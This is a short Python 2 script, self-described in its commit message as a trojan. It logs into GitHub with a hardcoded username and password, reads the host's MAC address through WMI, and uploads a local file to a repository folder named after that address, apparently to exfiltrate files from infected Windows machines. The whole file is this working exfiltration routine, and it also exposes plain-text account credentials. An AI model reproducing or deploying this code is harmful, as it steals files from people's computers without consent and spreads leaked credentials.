
import base64
import socket
import wmi 
import os 
import stat
from github3 import *


def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")
    #print(gh)
    repo = gh.repository("OXVyeah", "yeah")
    #print(repo)
    branch = repo.branch("master")

    return gh, repo, branch

def network(): 
    c = wmi.WMI ()
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
        print "MAC: %s" % interface.MACAddress 
        return str(interface.MACAddress).replace(":","-")


def uploadFilesToGit(filename,rep):
	fin = open(filename,'rb')
	binstr=fin.read()
	m=network()
#	filename=filename.split('\\')[-1]
	rep.create_file("data/"+str(m)+"/"+filename,"upload file by trojan",binstr)
	print "load ok"


def run(path):
	gh, repo, branch=connect_to_github()
	uploadFilesToGit(path,repo)

run("C:\pyworks\getmac.py")